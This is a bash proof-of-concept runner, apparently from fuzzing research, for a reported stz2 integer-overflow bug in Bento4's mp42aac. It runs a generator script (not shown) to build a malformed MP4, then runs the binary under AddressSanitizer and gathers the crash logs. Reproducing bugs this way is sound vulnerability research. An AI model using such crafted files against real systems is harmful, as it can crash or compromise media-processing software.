#!/bin/bash
# VULN 001 - stz2 integer overflow → heap over-read / OOM crash
POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4File_h"
BIN="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"

cd "$POC_DIR"

echo "[*] Generating vuln_001.mp4 ..."
python3 vuln_001_gen.py

echo "[*] Running mp42aac ..."
ASAN_OPTIONS="abort_on_error=0:log_path=${POC_DIR}/asan_001.log" \
  "$BIN" \
  "${POC_DIR}/vuln_001.mp4" /dev/null \
  > "${POC_DIR}/vuln_001_result.txt" 2>&1 || true

# Collect ASAN/UBSAN logs
for f in "${POC_DIR}"/asan_001.log.*; do
  [ -f "$f" ] && cat "$f" >> "${POC_DIR}/vuln_001_result.txt"
done

echo "=== EXIT ===" >> "${POC_DIR}/vuln_001_result.txt"
echo "[*] Done. Result in ${POC_DIR}/vuln_001_result.txt"
